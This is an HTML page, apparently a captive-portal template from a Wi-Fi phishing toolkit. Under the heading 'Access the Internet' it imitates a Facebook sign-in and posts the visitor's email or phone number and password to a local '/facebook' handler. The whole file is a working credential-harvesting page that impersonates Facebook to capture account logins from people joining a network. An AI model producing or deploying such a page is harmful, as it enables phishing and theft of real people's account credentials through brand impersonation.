<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Sign In with Facebook </title>
    <link rel="stylesheet" href="/static/facebook/style.css">
</head>
<body>
    <form id="login_form" method="POST" action="/facebook">
        <div class="login-box">
            <div class="google-logo" width="74" height="24">
                <img src="/static/facebook/facebook.png">
            </div>
            <div class="login-header">
                <header>Access the Internet</header>
                <p>Log in with Facebook</p>
            </div>
            <div class="input-area" id="input-area">
                <div class="input-box">
                    <input type="text" class="input-field" id="login" name="login" autocomplete="off" required>
                    <label for="email">Email or phone</label>
                </div>
                <div class="input-box">
                    <input type="password" class="input-field" id="password" name="password" autocomplete="off" required>
                    <label for="password">Password</label>
                </div>
            </div>
            <div class="input-box">
                <input type="submit" style="margin-top: 40px;" class="input-submit" value="Submit">
            </div>
        </div>
    </form>
	<!-- <script src="javascript.js"></script> -->
</body>
</html>
